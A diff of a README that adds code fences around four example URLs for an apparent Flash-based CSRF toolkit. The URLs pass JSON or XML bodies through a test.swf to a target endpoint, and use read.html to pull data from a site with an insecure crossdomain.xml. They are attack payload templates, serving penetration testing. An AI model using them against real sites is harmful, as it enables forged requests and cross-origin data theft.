@@ -29,13 +29,21 @@ If you have the questions regarding this repository - ping me in the Twitter: [@
 
 ## Example cases
 1) Exploit JSON CSRF, POST-based:
+```
 https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
+```
 2) Exploit XML CSRF, POST-based:
+```
 https://example.com/test.swf?jsonData=<root>[somedada]</root>&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
+```
 3) Exploit insecure crossdomain.xml (read data from target), GET-based:
+```
 https://example.com/read.html?jsonData=&endpoint=https://sometargethost.com/endpoint&reqmethod=GET
+```
 4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported:
+```
 https://example.com/read.html?jsonData=somedata&endpoint=https://sometargethost.com/endpoint&&ct=text/html
+```
 
 ## Cross Browser Testing
 
